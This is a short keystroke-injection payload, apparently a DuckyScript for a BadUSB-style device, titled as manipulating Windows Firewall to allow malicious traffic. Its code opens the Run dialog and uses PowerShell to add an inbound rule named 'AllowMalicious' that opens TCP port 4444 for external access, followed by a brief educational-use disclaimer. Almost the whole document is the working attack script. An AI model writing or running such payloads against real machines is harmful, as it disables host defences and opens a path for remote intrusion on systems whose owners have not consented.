# Manipulating Windows Firewall Rules to Allow Malicious Traffic

Creates a firewall rule allowing inbound traffic on port 4444, enabling external access.

```
DELAY 500
GUI r
DELAY 200
STRING powershell -Command "New-NetFirewallRule -DisplayName 'AllowMalicious' -Direction Inbound -Protocol TCP -LocalPort 4444 -Action Allow"
ENTER
```

> Disclaimer: This script is for educational purposes and should only be used in environments where you have explicit authorization to perform penetration testing. Always follow ethical guidelines and laws governing cybersecurity practices.